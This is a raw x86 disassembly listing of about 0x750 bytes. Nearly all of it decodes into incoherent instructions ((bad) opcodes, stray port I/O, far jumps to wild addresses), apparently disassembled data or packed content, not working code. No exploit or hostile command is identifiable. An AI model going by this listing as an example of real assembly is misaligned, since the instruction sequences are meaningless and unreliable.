  419f7f:	inc    ebx
  419f80:	daa    
  419f81:	push   ecx
  419f82:	and    ebx,DWORD PTR [esi+0x42]
  419f85:	inc    eax
  419f86:	(bad)  
  419f89:	pop    eax
  419f8a:	sbb    bl,bl
  419f8c:	les    ecx,FWORD PTR [eax]
  419f8e:	in     eax,0x15
  419f90:	shl    al,1
  419f92:	mov    edi,0x8a7a16ba
  419f97:	and    dh,ah
  419f99:	xchg   ebp,eax
  419f9a:	or     al,0x9f
  419f9c:	pop    ebp
  419f9d:	push   es
  419f9e:	rcl    BYTE PTR [eax+0x153df993],cl
  419fa4:	aaa    
  419fa5:	iret   
  419fa6:	push   edi
  419fa7:	cmp    DWORD PTR [edi],ebp
  419fa9:	data16 jne 0x419fe8
  419fac:	(bad)  
  419fad:	cld    
  419fae:	fbld   TBYTE PTR [edx-0x1e511afb]
  419fb4:	mov    bl,0xd7
  419fb6:	xor    dh,BYTE PTR [edx-0x8ec489b]
  419fbc:	jle    0x419f88
  419fbe:	add    al,BYTE PTR [edx]
  419fc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419fc1:	mov    edx,0x8e832112
  419fc6:	fidiv  WORD PTR [eax]
  419fc8:	imul   esp,DWORD PTR [edx+esi*2+0x26],0x7284d8e0
  419fd0:	leave  
  419fd1:	add    BYTE PTR [eax+0x3fa3f352],bh
  419fd7:	shl    ebp,cl
  419fd9:	ja     0x419f78
  419fdb:	push   es
  419fdc:	dec    ecx
  419fdd:	add    DWORD PTR [eax],edx
  419fdf:	int    0xf7
  419fe1:	jns    0x419fbb
  419fe3:	imul   ebp,DWORD PTR [edi+0x3a7f9c0b],0x9f18b64b
  419fed:	sub    al,0x1
  419fef:	ficom  DWORD PTR [ebp-0x3c]
  419ff2:	loopne 0x419f8c
  419ff4:	in     eax,0x2
  419ff6:	test   eax,0x8787a7ad
  419ffb:	and    ebx,edi
  419ffd:	push   eax
  419ffe:	outs   dx,DWORD PTR ds:[esi]
  41a000:	jae    0x419fdb
  41a002:	cdq    
  41a003:	(bad)  
  41a005:	xor    ecx,eax
  41a007:	or     BYTE PTR [eax+0x31],dh
  41a00a:	mov    edx,0x7ffc341f
  41a00f:	hlt    
  41a010:	ret    0x27d1
  41a013:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a014:	aaa    
  41a015:	pop    es
  41a016:	ret    0xbcbf
  41a019:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a01a:	popa   
  41a01b:	push   0xea718e0c
  41a020:	sbb    esi,DWORD PTR [ebx]
  41a022:	fidivr WORD PTR [ecx+0x58e0e38b]
  41a028:	ror    DWORD PTR [eax],1
  41a02a:	xor    BYTE PTR [edx-0x3c],cl
  41a02d:	out    dx,al
  41a02e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a02f:	adc    bl,BYTE PTR ds:0x1d29c73c
  41a035:	mov    al,0x1a
  41a037:	inc    eax
  41a038:	rol    ecx,cl
  41a03a:	ret    0xa5b3
  41a03d:	imul   ebp,DWORD PTR [edi],0xf4f17ea8
  41a043:	xlat   BYTE PTR ds:[ebx]
  41a044:	and    BYTE PTR ss:[ebp-0x6f7b5db0],cl
  41a04b:	jo     0x41a0c4
  41a04d:	clc    
  41a04e:	xchg   edi,eax
  41a04f:	pop    esp
  41a050:	push   cs
  41a051:	js     0x41a09b
  41a053:	jl     0x41a083
  41a055:	aaa    
  41a056:	test   DWORD PTR [ecx+ecx*2-0x36],esp
  41a05a:	mov    ds,WORD PTR [ecx-0x6ff43d29]
  41a060:	iret   
  41a061:	nop
  41a062:	jp     0x41a0b8
  41a064:	add    BYTE PTR [esi+0x70],ch
  41a067:	lock imul edx,DWORD PTR [edx-0x48e2f62f],0x44
  41a06f:	mov    al,ds:0xe8472d3e
  41a074:	mov    eax,0x63440e10
  41a079:	sub    DWORD PTR [eax-0x52],ebx
  41a07c:	or     al,0x20
  41a07e:	idiv   DWORD PTR [edi]
  41a080:	mov    al,ds:0x2b711bf6
  41a085:	js     0x41a042
  41a087:	or     ah,BYTE PTR [esi+0x3ebde3d6]
  41a08d:	mov    bl,dh
  41a08f:	pop    edi
  41a090:	cmp    ch,BYTE PTR [esi]
  41a092:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a093:	in     al,0x8e
  41a095:	data16 arpl WORD PTR [edi+0x7a],dx
  41a099:	not    DWORD PTR [eax+esi*4+0x15]
  41a09d:	sbb    ch,dh
  41a09f:	xor    DWORD PTR [ecx],eax
  41a0a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0a2:	adc    cl,BYTE PTR [ebp-0x55]
  41a0a5:	mov    esp,0x4f4f7c3f
  41a0aa:	add    ebx,eax
  41a0ac:	out    0xbd,al
  41a0ae:	and    DWORD PTR [eax],esp
  41a0b0:	in     eax,0xb8
  41a0b2:	jb     0x41a0f6
  41a0b4:	xor    DWORD PTR [esp+ebp*1+0xf],edx
  41a0b8:	pop    es
  41a0b9:	(bad)  
  41a0bb:	cmp    al,0xe6
  41a0bd:	cmp    al,0x3c
  41a0bf:	sbb    cl,cl
  41a0c1:	js     0x41a078
  41a0c3:	xor    cl,BYTE PTR ds:0xa756c2a7
  41a0c9:	push   ebx
  41a0ca:	cdq    
  41a0cb:	pushf  
  41a0cc:	cdq    
  41a0cd:	sub    eax,0xb48bc191
  41a0d2:	sbb    edi,DWORD PTR [edi]
  41a0d4:	mov    ds:0x4632fcba,eax
  41a0d9:	inc    eax
  41a0da:	dec    edx
  41a0db:	out    dx,eax
  41a0dc:	dec    esi
  41a0dd:	jl     0x41a0aa
  41a0df:	pop    esp
  41a0e0:	jecxz  0x41a0c8
  41a0e2:	leave  
  41a0e3:	in     al,dx
  41a0e4:	mov    bl,0x60
  41a0e6:	stc    
  41a0e7:	push   ebp
  41a0e8:	in     al,0xf2
  41a0ea:	fdiv   DWORD PTR [esi-0x57]
  41a0ed:	sub    al,0x85
  41a0ef:	jecxz  0x41a0d1
  41a0f1:	js     0x41a14c
  41a0f3:	add    edi,DWORD PTR [esp+edi*2]
  41a0f6:	mov    edi,0xcfae0d22
  41a0fb:	jmp    0x92b62c4b
  41a100:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a101:	mov    BYTE PTR [edx],ch
  41a103:	dec    esp
  41a104:	imul   eax,ecx,0xffffff91
  41a107:	fistp  WORD PTR [ecx+esi*8-0x4d589335]
  41a10e:	test   DWORD PTR [eax-0x5d7b84bf],ecx
  41a114:	int3   
  41a115:	mov    al,0x8d
  41a117:	xchg   esp,eax
  41a118:	cs jbe 0x41a115
  41a11b:	ins    DWORD PTR es:[edi],dx
  41a11c:	imul   ebx,DWORD PTR [eax],0xf
  41a11f:	mov    gs,WORD PTR [eax-0x4da5f757]
  41a125:	hlt    
  41a126:	stos   BYTE PTR es:[edi],al
  41a127:	ss ds fld DWORD PTR es:[edi+ebp*2-0x65]
  41a12e:	(bad)  
  41a12f:	mov    edx,0xffcfaa5b
  41a134:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a135:	mov    dh,0x6
  41a137:	test   DWORD PTR [esi+edx*1+0x53267ed1],esp
  41a13e:	jle    0x41a18a
  41a140:	pop    edi
  41a141:	add    eax,0x30993ecc
  41a146:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a147:	mov    ah,0x3c
  41a149:	mov    ecx,0xc9d92cfd
  41a14e:	sbb    ebx,ebp
  41a150:	shr    BYTE PTR [ebp-0x772696c7],1
  41a156:	adc    DWORD PTR [edi],ebx
  41a158:	es (bad) 
  41a15b:	loopne 0x41a191
  41a15d:	in     eax,0x4a
  41a15f:	out    0x3c,al
  41a161:	sub    edi,edx
  41a163:	imul   ah
  41a165:	mov    ebp,0x3bfcd83f
  41a16a:	fisttp DWORD PTR [edx+0x3d]
  41a16d:	ds in  eax,dx
  41a16f:	dec    ecx
  41a170:	cld    
  41a171:	add    dh,BYTE PTR [ebx]
  41a173:	sbb    eax,0x376f52d5
  41a178:	push   ecx
  41a179:	leave  
  41a17a:	jmp    0xcec8d854
  41a17f:	adc    DWORD PTR [esi],0x302fb302
  41a185:	ja     0x41a1ad
  41a187:	mov    ch,0xe6
  41a189:	lods   al,BYTE PTR ds:[esi]
  41a18a:	push   0x8e5e89c5
  41a18f:	mov    BYTE PTR [eax-0x2c],ch
  41a192:	sub    eax,0xcc01e1b2
  41a197:	sbb    eax,0x80696c34
  41a19c:	jno    0x41a1bd
  41a19e:	push   ss
  41a19f:	and    BYTE PTR [esp+ecx*8+0x6],0x69
  41a1a4:	fnstsw WORD PTR [edx]
  41a1a6:	test   ah,al
  41a1a8:	jnp    0x41a150
  41a1aa:	or     dh,bl
  41a1ac:	mov    edx,0xd320bfd5
  41a1b1:	leave  
  41a1b2:	xor    cl,BYTE PTR [edx]
  41a1b4:	xor    edx,DWORD PTR [edx+0xc]
  41a1b7:	inc    ebp
  41a1b8:	scas   eax,DWORD PTR es:[edi]
  41a1b9:	retf   0x61cb
  41a1bc:	sbb    DWORD PTR [ecx-0x2a],ebp
  41a1bf:	pop    edx
  41a1c0:	ret    0xa4d5
  41a1c3:	stos   DWORD PTR es:[edi],eax
  41a1c4:	jmp    0x41a1ff
  41a1c6:	adc    al,0xb
  41a1c8:	arpl   WORD PTR [ecx+0x3b],bx
  41a1cb:	adc    BYTE PTR [esi],0xb4
  41a1ce:	pop    ebx
  41a1cf:	pop    ebx
  41a1d0:	mov    esp,DWORD PTR [ebx+0x33]
  41a1d3:	sub    eax,0xdd7707ba
  41a1d8:	call   DWORD PTR [ebx+edi*1-0x2f]
  41a1dc:	mov    ecx,DWORD PTR [ebp-0xc]
  41a1df:	mov    DWORD PTR [ebp+0x8],ecx
  41a1e2:	mov    ecx,DWORD PTR [ebp+0x8]
  41a1e5:	je     0x420e5d
  41a1eb:	jmp    0x41c5ad
  41a1f0:	mov    ecx,DWORD PTR [ebp+0x8]
  41a1f3:	mov    edx,DWORD PTR [ebp-0x8]
  41a1f6:	jmp    0x41c583
  41a1fb:	cmp    BYTE PTR [edi-0x66],ch
  41a1fe:	ja     0x41a189
  41a200:	ja     0x41a23d
  41a202:	xchg   ebx,eax
  41a203:	xchg   esp,eax
  41a204:	sub    BYTE PTR [edi],bh
  41a206:	into   
  41a207:	popf   
  41a208:	pop    es
  41a209:	jb     0x41a280
  41a20b:	outs   dx,BYTE PTR ds:[esi]
  41a20c:	sbb    al,0x7d
  41a20e:	jp     0x41a21a
  41a210:	pop    edi
  41a211:	jp     0x41a28d
  41a213:	adc    al,0xcc
  41a215:	lods   al,BYTE PTR ds:[esi]
  41a216:	push   esp
  41a217:	repz add eax,0x1374dce
  41a21d:	ror    BYTE PTR [edx+0x5],0xde
  41a221:	mov    dh,0x82
  41a223:	dec    ecx
  41a224:	dec    ecx
  41a225:	jmp    DWORD PTR [ebx]
  41a227:	fucompp 
  41a229:	mov    ch,0x7f
  41a22b:	xchg   esp,eax
  41a22c:	dec    esp
  41a22d:	and    DWORD PTR [edi],esp
  41a22f:	out    0x10,al
  41a231:	mov    esp,0x78bd49d7
  41a236:	cmp    ah,BYTE PTR [esi-0x38]
  41a239:	inc    ebx
  41a23a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a23b:	jns    0x41a29d
  41a23d:	mov    DWORD PTR [ecx],edx
  41a23f:	adc    al,0xcf
  41a241:	addr16 (bad) 
  41a243:	mov    ebx,0xe8a8b9e2
  41a248:	sub    ah,BYTE PTR [edi-0x69f7a952]
  41a24e:	xor    DWORD PTR [esi],edx
  41a250:	adc    eax,0xbe1e407f
  41a255:	mov    ds:0xbb80876a,al
  41a25a:	jmp    0x56f1dc60
  41a25f:	jae    0x41a252
  41a261:	sbb    ch,BYTE PTR [edi+0x35720369]
  41a267:	iret   
  41a268:	test   eax,0xbc54a0cf
  41a26d:	mov    ds:0xe457dd8d,al
  41a272:	pop    ss
  41a273:	lods   al,BYTE PTR ds:[esi]
  41a274:	arpl   WORD PTR [edx],di
  41a276:	shl    DWORD PTR [eax+ebx*1+0x57],0x7a
  41a27b:	push   edi
  41a27c:	jg     0x41a2db
  41a27e:	mov    edi,0x40c6245f
  41a283:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a284:	fisttp QWORD PTR [ebx]
  41a286:	retf   0x84aa
  41a289:	inc    edi
  41a28a:	sub    eax,0xcfedd04e
  41a28f:	xor    al,0xc4
  41a291:	test   BYTE PTR [eax+0x2e47a4c6],dh
  41a297:	and    DWORD PTR [ecx-0x7f7ea734],esp
  41a29d:	sub    DWORD PTR [eax-0x22],edx
  41a2a0:	cmp    al,0x3
  41a2a2:	loopne 0x41a313
  41a2a4:	es pop ds
  41a2a6:	cdq    
  41a2a7:	(bad)  
  41a2a8:	(bad)  
  41a2a9:	sbb    dl,BYTE PTR [eax-0x530c96e0]
  41a2af:	sbb    ebx,ebp
  41a2b1:	mov    cl,0x2f
  41a2b3:	js     0x41a324
  41a2b5:	push   ebp
  41a2b6:	daa    
  41a2b7:	mov    cs,WORD PTR [edx]
  41a2b9:	out    dx,eax
  41a2ba:	jno    0x41a287
  41a2bc:	ret    0xd8d1
  41a2bf:	add    al,ch
  41a2c1:	test   eax,0x23ff226f
  41a2c6:	imul   esp,DWORD PTR [ecx-0x2dfb8589],0xffffffd3
  41a2cd:	mov    esi,0x885f23f4
  41a2d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2d3:	lea    edi,[esi-0x2f]
  41a2d6:	push   ss
  41a2d7:	mov    ebp,?
  41a2d9:	push   edi
  41a2da:	pop    eax
  41a2db:	test   eax,0x8040e3ee
  41a2e0:	sub    al,0x7d
  41a2e2:	enter  0x153e,0x5e
  41a2e6:	or     eax,0x31565495
  41a2eb:	cmp    ah,bh
  41a2ed:	pop    esi
  41a2ee:	dec    esi
  41a2ef:	mov    dl,0x41
  41a2f1:	cmp    BYTE PTR [ecx+eiz*8-0x4ba3b644],al
  41a2f8:	dec    eax
  41a2f9:	outs   dx,DWORD PTR ds:[esi]
  41a2fa:	call   FWORD PTR [esi+0x12]
  41a2fd:	add    ebx,DWORD PTR [esi-0x5]
  41a300:	test   BYTE PTR [edx+0x45],ch
  41a303:	xor    al,0x14
  41a305:	js     0x41a347
  41a307:	lods   eax,DWORD PTR fs:[esi]
  41a309:	or     BYTE PTR [ebp+0x24],dl
  41a30c:	cli    
  41a30d:	jnp    0x41a32a
  41a30f:	inc    esi
  41a310:	inc    ecx
  41a311:	out    0xa7,al
  41a313:	scas   eax,DWORD PTR es:[edi]
  41a314:	mov    esi,0xc0855c43
  41a319:	mov    ebp,0xdc51354c
  41a31e:	div    DWORD PTR [esi+0x20]
  41a321:	xor    BYTE PTR [ebx],bl
  41a323:	mov    ch,0x20
  41a325:	out    dx,al
  41a326:	scas   eax,DWORD PTR es:[edi]
  41a327:	mov    edi,ebx
  41a329:	cmp    al,0xb7
  41a32b:	gs jmp 0xea373112
  41a331:	pop    ds
  41a332:	inc    edi
  41a333:	adc    DWORD PTR [ebx-0x41],0x4630d998
  41a33a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a33b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a33c:	add    ebp,DWORD PTR [edx-0x3f4b5a04]
  41a342:	imul   esi,esp,0x2d
  41a345:	cmc    
  41a346:	jo     0x41a30d
  41a348:	xchg   DWORD PTR [ebx-0x5f1ba3de],esi
  41a34e:	adc    bl,BYTE PTR [ebp*4+0x2bb70534]
  41a355:	mov    ebx,edx
  41a357:	int    0xb7
  41a359:	xchg   ebp,eax
  41a35a:	rcr    BYTE PTR [ebx-0x10321ad7],cl
  41a360:	mov    ah,0xd0
  41a362:	and    DWORD PTR [ebx+ecx*8-0x3a],ebx
  41a366:	daa    
  41a367:	repz mov ch,0x89
  41a36a:	xchg   ecx,eax
  41a36b:	jo     0x41a3df
  41a36d:	xor    al,0xb6
  41a36f:	and    ah,BYTE PTR [esi+eiz*2-0x56]
  41a373:	and    ah,BYTE PTR [eax-0xd]
  41a376:	add    edi,ecx
  41a378:	mov    DWORD PTR [eax],0xff99bda5
  41a37e:	ret    
  41a37f:	and    BYTE PTR [ebx-0x2a],bh
  41a382:	mov    edx,0xf5f05966
  41a387:	enter  0xbe0e,0x81
  41a38b:	mov    ch,0x6a
  41a38d:	mov    ebx,0xf8a35d15
  41a392:	iret   
  41a393:	push   eax
  41a394:	mov    WORD PTR [ebx+eax*8+0x2d],gs
  41a398:	in     al,0x44
  41a39a:	mov    ecx,eax
  41a39c:	mov    bh,0xfc
  41a39e:	repnz test BYTE PTR [ebx-0x55c047fc],dl
  41a3a5:	dec    ecx
  41a3a6:	call   0xa8dc208a
  41a3ab:	js     0x41a3cd
  41a3ad:	popa   
  41a3ae:	rcl    BYTE PTR [edi-0xa67e938],1
  41a3b4:	mov    ds:0xdf48ef20,eax
  41a3b9:	aad    0x8d
  41a3bb:	fs cdq 
  41a3bd:	jle    0x41a39d
  41a3bf:	(bad)  
  41a3c0:	fstp   TBYTE PTR [ebx-0x18e70629]
  41a3c6:	xor    DWORD PTR [ecx+0x3b],eax
  41a3c9:	gs dec eax
  41a3cb:	jmp    0x839d:0xcf7c7fe5
  41a3d2:	xor    cl,BYTE PTR [ebx]
  41a3d4:	cmp    dh,BYTE PTR [ecx-0x3bdc1d86]
  41a3da:	jl     0x41a3d3
  41a3dc:	mov    ecx,0x5c2a6362
  41a3e1:	ja     0x41a367
  41a3e3:	sub    al,0x7b
  41a3e5:	ror    ch,0x9d
  41a3e8:	push   ebx
  41a3e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3ea:	scas   al,BYTE PTR es:[edi]
  41a3eb:	push   ebx
  41a3ec:	outs   dx,DWORD PTR ds:[esi]
  41a3ed:	or     al,0x40
  41a3ef:	sar    DWORD PTR [eax],1
  41a3f1:	pushf  
  41a3f2:	add    eax,0xd78f6a05
  41a3f7:	aad    0xa
  41a3f9:	mov    cl,BYTE PTR [edi-0xf]
  41a3fc:	(bad)  
  41a3fd:	lods   al,BYTE PTR ds:[esi]
  41a3fe:	push   ebp
  41a3ff:	in     eax,dx
  41a400:	adc    DWORD PTR [edi+0x34],ebp
  41a403:	inc    esi
  41a404:	inc    edi
  41a405:	out    0x1a,al
  41a407:	rcl    BYTE PTR [edi+0x2e],cl
  41a40a:	ficomp WORD PTR [eax]
  41a40c:	jae    0x41a43a
  41a40e:	(bad)  
  41a40f:	push   esi
  41a410:	add    eax,0xdcc44cf7
  41a415:	shr    BYTE PTR [ecx],1
  41a417:	or     BYTE PTR [eax+eax*2],0x46
  41a41b:	scas   al,BYTE PTR es:[edi]
  41a41c:	pop    esi
  41a41d:	inc    eax
  41a41e:	push   esp
  41a41f:	jno    0x41a3ed
  41a421:	inc    esp
  41a422:	push   ss
  41a423:	jo     0x41a499
  41a425:	adc    BYTE PTR [esi],cl
  41a427:	stc    
  41a428:	push   esi
  41a429:	loopne 0x41a42b
  41a42b:	aaa    
  41a42c:	jo     0x41a3c3
  41a42e:	jge    0x41a4a1
  41a430:	adc    eax,0x8c191f0a
  41a435:	mov    eax,ds:0x9f1b714
  41a43a:	cdq    
  41a43b:	dec    eax
  41a43c:	jbe    0x41a454
  41a43e:	jp     0x41a437
  41a440:	mov    ebx,0xc1114395
  41a445:	clc    
  41a446:	sub    DWORD PTR [eax+edx*1+0x311fb325],esi
  41a44d:	(bad)  
  41a44e:	cld    
  41a44f:	out    dx,al
  41a450:	cwde   
  41a451:	call   0x8909:0xb5001d2b
  41a458:	call   0xe9b3:0x6780d6bd
  41a45f:	and    al,0x51
  41a461:	and    eax,0x786e7baa
  41a466:	dec    edi
  41a467:	outs   dx,DWORD PTR ds:[esi]
  41a468:	xchg   esi,eax
  41a469:	push   ds
  41a46a:	inc    edx
  41a46b:	pop    edx
  41a46c:	inc    esp
  41a46d:	nop
  41a46e:	adc    DWORD PTR [esi+0x6b0a7b88],edi
  41a474:	test   BYTE PTR [edi+0x3b0980fe],0x18
  41a47b:	lds    ebp,FWORD PTR [ecx+0x41]
  41a47e:	mov    ebp,0xeaa8795f
  41a483:	mov    ecx,0xd0ef30d3
  41a488:	in     eax,dx
  41a489:	inc    edi
  41a48a:	pop    ebx
  41a48b:	leave  
  41a48c:	es nop
  41a48e:	cwde   
  41a48f:	(bad)  
  41a490:	neg    bh
  41a492:	jp     0x41a509
  41a494:	and    al,0xcb
  41a496:	xor    dl,BYTE PTR [eax-0x4c020ebb]
  41a49c:	fadd   QWORD PTR [edi+esi*4-0x7b]
  41a4a0:	out    0xa1,eax
  41a4a2:	push   0x45f42206
  41a4a7:	dec    ebp
  41a4a8:	stos   DWORD PTR es:[edi],eax
  41a4a9:	sub    DWORD PTR [ebp-0x7e],esp
  41a4ac:	ins    DWORD PTR es:[edi],dx
  41a4ad:	pusha  
  41a4ae:	out    dx,al
  41a4af:	pop    ebp
  41a4b0:	leave  
  41a4b1:	fcmovne st,st(3)
  41a4b3:	push   esp
  41a4b4:	push   ecx
  41a4b5:	or     esp,esp
  41a4b7:	adc    al,0x89
  41a4b9:	out    0x24,eax
  41a4bb:	jmp    0xc3059c67
  41a4c0:	retf   
  41a4c1:	push   ds
  41a4c2:	sub    eax,0x6bd7f003
  41a4c7:	adc    al,BYTE PTR [ebx-0x5ff7ef1e]
  41a4cd:	cmp    al,0xba
  41a4cf:	jo     0x41a49a
  41a4d1:	xor    eax,0xf6472f9a
  41a4d6:	push   edi
  41a4d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a4d8:	(bad)  
  41a4da:	pop    edx
  41a4db:	retf   
  41a4dc:	ficom  WORD PTR [eax+0x7cb1b35f]
  41a4e2:	mov    BYTE PTR [esp+ebx*8+0xd],cl
  41a4e6:	sub    al,0xa9
  41a4e8:	mov    al,ds:0x75f27638
  41a4ed:	test   bh,cl
  41a4ef:	jo     0x41a485
  41a4f1:	mov    ds:0x9c174196,al
  41a4f6:	inc    eax
  41a4f7:	test   ebx,esp
  41a4f9:	repnz xchg ebx,eax
  41a4fb:	sbb    ebp,eax
  41a4fd:	out    0x5e,eax
  41a4ff:	imul   esi,DWORD PTR [eax-0x185fd09e],0x997f04b7
  41a509:	jb     0x41a507
  41a50b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a50c:	push   ecx
  41a50d:	xor    bl,BYTE PTR [ebx]
  41a50f:	fimul  WORD PTR [ecx-0x7c]
  41a512:	les    ebx,FWORD PTR [ecx]
  41a514:	int    0xbe
  41a516:	ret    
  41a517:	jns    0x41a53f
  41a519:	pop    ss
  41a51a:	test   DWORD PTR [ecx+ebp*8],edx
  41a51d:	and    DWORD PTR [esi+0x22],ebp
  41a520:	jae    0x41a4a6
  41a522:	push   ebx
  41a523:	xor    edx,0xd88276d6
  41a529:	les    edi,FWORD PTR [eax-0x58efadcb]
  41a52f:	call   0xc3a4:0x64f19f13
  41a536:	dec    ebp
  41a537:	data16 mov es,WORD PTR [ebp+0x50]
  41a53b:	outs   dx,DWORD PTR ds:[esi]
  41a53c:	jo     0x41a5ad
  41a53e:	icebp  
  41a53f:	mov    cl,ch
  41a541:	or     eax,0xae1b2fa4
  41a546:	aas    
  41a547:	outs   dx,DWORD PTR ds:[esi]
  41a548:	les    esp,FWORD PTR [ebp-0x1f]
  41a54b:	push   edi
  41a54c:	lahf   
  41a54d:	inc    edi
  41a54e:	inc    ebx
  41a54f:	test   BYTE PTR [edx+0x5e],cl
  41a552:	cmc    
  41a553:	pushf  
  41a554:	inc    esp
  41a555:	int3   
  41a556:	push   edx
  41a557:	fsub   st,st(6)
  41a559:	dec    ebp
  41a55a:	clc    
  41a55b:	pop    ebp
  41a55c:	push   ebx
  41a55d:	ja     0x41a51a
  41a55f:	inc    edi
  41a560:	bound  ebx,QWORD PTR [ebp-0x6ceab537]
  41a566:	pop    eax
  41a567:	mov    dl,0xab
  41a569:	adc    edi,DWORD PTR [edi+0x22]
  41a56c:	les    edx,FWORD PTR [ebx-0x26]
  41a56f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a570:	mov    ebp,DWORD PTR [ebx+0x58aca321]
  41a576:	jnp    0x41a5b0
  41a578:	and    edi,ebp
  41a57a:	pop    edx
  41a57b:	shl    DWORD PTR [ecx+0x1e9b0739],cl
  41a581:	inc    esi
  41a582:	xchg   BYTE PTR [edi+0x6a],dl
  41a585:	(bad)  
  41a586:	in     eax,dx
  41a587:	adc    ebp,esi
  41a589:	jbe    0x41a58d
  41a58b:	retf   
  41a58c:	jmp    0xb04b50a0
  41a591:	jae    0x41a5f2
  41a593:	mov    ch,0x8d
  41a595:	mov    ds:0x845503e0,al
  41a59a:	lahf   
  41a59b:	into   
  41a59c:	pop    esp
  41a59d:	repz lds edx,FWORD PTR [edi-0x432611a2]
  41a5a4:	sbb    di,WORD PTR [ebp-0x473a337b]
  41a5ab:	(bad)  
  41a5ac:	imul   ebp,eax,0xffffffcd
  41a5af:	jge    0x41a558
  41a5b1:	inc    edx
  41a5b2:	mov    dl,0x55
  41a5b4:	ss leave 
  41a5b6:	fs aaa 
  41a5b8:	shl    DWORD PTR [eax+0x67ce4d2c],cl
  41a5be:	into   
  41a5bf:	or     al,0xfe
  41a5c1:	retf   0x959b
  41a5c4:	push   cs
  41a5c5:	rcl    BYTE PTR [ebx],cl
  41a5c7:	mov    eax,ds:0xad2f3e99
  41a5cc:	push   esi
  41a5cd:	sub    edx,DWORD PTR [eax-0x3a]
  41a5d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5d1:	loop   0x41a644
  41a5d3:	mov    BYTE PTR [edi+0x2067edff],ah
  41a5d9:	mov    BYTE PTR [eax-0x64fa5f83],dh
  41a5df:	retf   
  41a5e0:	sbb    eax,0xd379c827
  41a5e5:	sbb    ch,BYTE PTR [eax-0x8fded96]
  41a5eb:	out    dx,al
  41a5ec:	sbb    ebp,DWORD PTR [ecx]
  41a5ee:	je     0x41a624
  41a5f0:	sar    BYTE PTR [edi-0x3264d694],0x4f
  41a5f7:	mov    al,0x34
  41a5f9:	push   edi
  41a5fa:	push   cs
  41a5fb:	jge    0x41a62a
  41a5fd:	rcr    DWORD PTR [ebx+0x72a33ceb],1
  41a603:	jo     0x41a5b6
  41a605:	sub    esp,edi
  41a607:	xchg   DWORD PTR [esi+0x1e],edx
  41a60a:	test   BYTE PTR ds:0xc52fba5,dl
  41a610:	scas   eax,DWORD PTR es:[edi]
  41a611:	and    DWORD PTR [eax+0x5],edx
  41a614:	stos   DWORD PTR es:[edi],eax
  41a615:	enter  0x26a0,0x77
  41a619:	or     cl,BYTE PTR [esi+0x34]
  41a61c:	dec    ebp
  41a61d:	inc    ebx
  41a61e:	fnstsw WORD PTR [ebx+eax*8]
  41a621:	mov    ah,0x61
  41a623:	repz dec eax
  41a625:	or     BYTE PTR [ecx-0x6671c4cd],dl
  41a62b:	lock aam 0xf6
  41a62e:	mov    ecx,0x17646364
  41a633:	mov    cl,0x3e
  41a635:	mov    BYTE PTR [ecx-0x2d],bh
  41a638:	retf   0xd30e
  41a63b:	mov    esi,esp
  41a63d:	pop    ss
  41a63e:	je     0x41a69a
  41a640:	adc    eax,0x421236df
  41a645:	arpl   WORD PTR [esi],sp
  41a647:	xchg   ecx,eax
  41a648:	cwde   
  41a649:	sar    cl,0x12
  41a64c:	mov    ebx,0xc52f9b22
  41a651:	stos   BYTE PTR es:[edi],al
  41a652:	jb     0x41a6af
  41a654:	and    al,0xc9
  41a656:	cld    
  41a657:	nop
  41a658:	push   cs
  41a659:	out    0xdc,eax
  41a65b:	ins    DWORD PTR es:[edi],dx
  41a65c:	(bad)  
  41a65d:	jmpw   0x819b
  41a661:	sti    
  41a662:	dec    eax
  41a663:	stos   DWORD PTR es:[edi],eax
  41a664:	mov    dh,0x29
  41a666:	sbb    al,0x49
  41a668:	jne    0x41a637
  41a66a:	(bad)  [edx-0x2c]
  41a66d:	and    ecx,edi
  41a66f:	xchg   edx,eax
  41a670:	dec    ebx
  41a671:	cmc    
  41a672:	rcl    BYTE PTR [edx+esi*4-0x51],1
  41a676:	retf   0xa48d
  41a679:	push   ds
  41a67a:	ficomp DWORD PTR ds:[edx]
  41a67d:	mov    eax,ds:0xd6b57516
  41a682:	fmul   QWORD PTR [ebx-0x14809bec]
  41a688:	loope  0x41a69a
  41a68a:	outs   dx,BYTE PTR ds:[esi]
  41a68b:	int3   
  41a68c:	sub    DWORD PTR [ebx-0x22],0x1a
  41a690:	fadd   st,st(0)
  41a692:	xor    eax,0xed7af12b
  41a697:	sti    
  41a698:	(bad)  
  41a699:	ins    BYTE PTR es:[edi],dx
  41a69a:	in     eax,0xee
  41a69c:	pushf  
  41a69d:	rol    BYTE PTR [esi+0x1182b618],1
  41a6a3:	hlt    
  41a6a4:	inc    ebp
  41a6a5:	jmp    0x41a63b
  41a6a7:	retf   
  41a6a8:	repnz push ebx
  41a6aa:	imul   DWORD PTR [esi+0x3e]
  41a6ad:	lds    eax,FWORD PTR [ebp+0x12c3a189]
  41a6b3:	jl     0x41a69d
  41a6b5:	stos   BYTE PTR es:[edi],al
  41a6b6:	push   edi
  41a6b7:	cmc    
  41a6b8:	loop   0x41a64e
  41a6ba:	fdiv   st(7),st
  41a6bc:	pop    esp
  41a6bd:	push   edx
  41a6be:	cmp    eax,0x59c2f489
  41a6c3:	test   al,0x5d
  41a6c5:	push   edi
  41a6c6:	or     dh,BYTE PTR [edx+0x51]
  41a6c9:	imul   ecx,DWORD PTR [edi-0x469246db],0xcd4e5c74
  41a6d3:	jg     0x41a6ea
  41a6d5:	inc    eax
